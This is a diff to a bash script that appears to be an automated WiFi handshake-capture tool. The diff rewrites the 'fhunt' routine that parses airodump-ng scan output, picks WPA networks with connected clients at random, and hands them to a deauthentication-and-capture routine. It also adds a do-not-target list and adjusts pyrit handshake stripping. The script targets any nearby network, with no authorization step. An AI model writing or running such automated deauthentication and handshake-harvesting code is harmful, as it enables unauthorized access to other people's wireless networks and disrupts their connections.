@@ -47,6 +47,89 @@ fbotstart()																#Automagically find active clients and collect new ha
 	fhunt
 }
 
+fhunt()																	#find active clients that havn't been handshaked yet for autobot
+{
+	rm -rf $HOME/tmp5 2> /dev/null
+	sleep 0.4
+	if [ ! -f $HOME/tmp-01.csv ] 2> /dev/null
+		then
+			sleep 1
+			fhunt
+	fi
+	BSSIDL="$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -uR | head -n 1)"
+	if [ $BSSIDL -z ] 2> /dev/null
+		then
+			fhunt
+		else
+			BSSID=$BSSIDL
+	fi
+	
+	ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 14 | head -n 1)
+	ESSID=${ESSID:1}
+	if [ $ESSID -z ] 2>/dev/null
+		then
+			fhunt
+		else
+			if [ "$LASTBSSID" != "$BSSID" ] 2> /dev/null
+				then
+					if [ $(cat $HOME/dnt | grep $BSSID) -z ] 2> /dev/null
+						then
+							cat $HOME/tmp-01.csv | grep Station -A 20 | grep ":" | cut -d ',' -f 4,6 | tr -d '(not associated)' > $HOME/tmp4
+							while read LINE
+								do
+									if [ $(echo $LINE | cut -d ',' -f 2) -z ] 2> /dev/null
+										then
+											A=1
+										else
+											echo "$LINE" >> $HOME/tmp5
+									fi
+								done < $HOME/tmp4
+							LASTBSSID=$BSSID
+							POWER=$(cat $HOME/tmp5 | grep $BSSID | head -n 1 | cut -d ',' -f 1)
+							POWER=${POWER:1}
+							CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
+							CHAN=$((CHAN + 1 - 1))
+							CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
+							clear
+							$COLOR 1;$COLOR2 2;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
+							echo
+							$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
+							echo
+							$COLOR 1;echo " [>] EVALUATING TARGET [<] ";$COLOR 9
+							$COLOR2 1;echo " [*] ESSID: $ESSID"
+							echo " [*] BSSID: $BSSID"
+							echo " [*] CLIENT: $CLIE"
+							echo " [*] CHANNEL: $CHAN"
+							echo " [*] POWER: $POWER";$COLOR2 9
+							if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSIDL) -z ] 2> /dev/null
+								then
+									$COLOR 1;echo " [*] We need this handshake [*] ";$COLOR 9
+									fautocap
+								else
+									$COLOR 2;echo " [*] We already have this handshake [*] ";$COLOR 9
+									echo "$BSSID" >> $HOME/dnt
+									sleep 3
+									clear
+									$COLOR 1;$COLOR2 2;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
+									echo
+									$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
+									echo
+									$COLOR 1;echo " [>] EVALUATING TARGET [<] ";$COLOR 9
+									$COLOR2 1;echo " [*] ESSID: "
+									echo " [*] BSSID: "
+									echo " [*] CLIENT: "
+									echo " [*] CHANNEL: "
+									echo " [*] POWER: ";$COLOR2 9
+									fhunt
+							fi
+					fi	
+			fi
+			
+	fi
+	
+	fhunt
+}
+
 fautocap()
 {
 	killall airodump-ng
@@ -102,95 +185,6 @@ fautocap()
 	sleep 3
 	fbotstart
 }		
-
-fhunt()																	#find active clients that havn't been handshaked yet for autobot
-{
-	DONET=""
-	rm -rf $HOME/tmp5 2> /dev/null
-	while [ $DONET -z ] 2>/dev/null
-		do
-			sleep 0.2
-			if [ ! -f $HOME/tmp-01.csv ] 2> /dev/null
-				then
-					sleep 1
-					fhunt
-			fi
-			fpower
-			BSSIDL="$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -uR | head -n 1)"
-			if [ $BSSIDL -z ] 2> /dev/null
-				then
-					fhunt
-				else
-					BSSID=$BSSIDL
-			fi
-			
-			POWER=$(cat $HOME/tmp5 | grep $BSSID | head -n 1 | cut -d ',' -f 1)
-			POWER=${POWER:1}
-			ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 14 | head -n 1)
-			ESSID=${ESSID:1}
-			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
-			CHAN=$((CHAN + 1 - 1))
-			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
-			if [ $ESSID -z ] 2>/dev/null
-				then
-					fhunt
-				else
-					if [ "$LASTBSSID" != "$BSSID" ] 2> /dev/null
-						then
-							clear
-							$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
-							echo
-							$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
-							echo
-							$COLOR 1;echo " [>] EVALUATING TARGET [<] ";$COLOR 9
-							$COLOR2 1;echo " [*] ESSID: $ESSID"
-							echo " [*] BSSID: $BSSID"
-							echo " [*] CLIENT: $CLIE"
-							echo " [*] CHANNEL: $CHAN"
-							echo " [*] POWER: $POWER";$COLOR2 9
-							if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSIDL) -z ] 2> /dev/null
-								then
-									DONET=1
-									$COLOR 1;echo " [*] We need this handshake [*] ";$COLOR 9
-									fautocap
-								else
-									$COLOR 2;echo " [*] We already have this handshake [*] ";$COLOR 9
-									LASTBSSID=$BSSID
-									fhunt
-							fi				
-					fi
-					
-			fi
-			
-			if [ $BSSID -z ] 2> /dev/null
-				then
-					DONET=""
-			fi
-			if [ $ESSID -z ] 2> /dev/null
-				then
-					DONET=""
-			fi
-			if [ $CLIE -z ] 2>/dev/null
-				then
-					DONET=""
-			fi
-			LASTBSSID=$BSSID
-		done
-}
-
-fpower()
-{
-	cat $HOME/tmp-01.csv | grep Station -A 20 | grep ":" | cut -d ',' -f 4,6 | tr -d '(not associated)' > $HOME/tmp4
-	while read LINE
-		do
-			if [ $(echo $LINE | cut -d ',' -f 2) -z ] 2> /dev/null
-				then
-					A=1
-				else
-					echo "$LINE" >> $HOME/tmp5
-			fi
-		done < $HOME/tmp4
-}
 
 fanalyze()																#Analyze handshakes
 {
@@ -406,7 +400,7 @@ fcap()																	#Deauth, capture and strip handshakes
 	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
 	DATE=$( date +%Y_%m_%d_%H%M%S )
 	ESSID=$(echo "$ESSID" | sed 's/ /_/g')
-	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
+	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE.cap strip | grep 'New pcap-file'
 	airmon-ng stop mon0
 	rm -rf $HOME/tmp*
 	clear
@@ -454,6 +448,7 @@ fexit()																	#Exit
 	tput setab 9
 	killall aircrack-ng 2> /dev/null
 	rm -rf $HOME/tmp* 2> /dev/null
+	rm -rf $HOME/dnt 2> /dev/null
 	MOND=$(ifconfig | grep mon0)
 	if [ $MOND -z ] 2> /dev/null
 		then
@@ -490,6 +485,8 @@ fstart()																#Startup
 	mkdir -p $HOME/Desktop/cap
 	mkdir -p $HOME/Desktop/cap/handshakes
 	touch $HOME/Desktop/cap/handshakes/got
+	rm -rf $HOME/dnt 2> /dev/null
+	touch $HOME/dnt
 
 	if [ $MOND -z ] 2> /dev/null
 		then
